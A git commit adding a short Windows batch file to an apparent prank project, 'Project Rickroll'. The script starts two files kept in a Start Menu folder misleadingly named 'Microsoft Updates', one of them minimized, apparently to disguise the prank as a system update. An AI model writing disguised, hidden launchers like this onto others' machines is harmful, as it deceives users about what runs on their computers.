da576cc8f7bed08aa08725622e9aef858cf50f21
Sean <155543056+SeanFromWP@users.noreply.github.com>
2024-12-11 11:36:18 +0800

    Create start_menu.bat

---
+++ Projects/Project Rickroll/start_menu.bat
@@ -0,0 +1,4 @@
+@echo off
+
+start %AppData%\Microsoft\Windows\Start Menu\Programs\Microsoft Updates\msrkl.rta
+start /min %AppData%\Microsoft\Windows\Start Menu\Programs\Microsoft Updates\msrklbg.bat
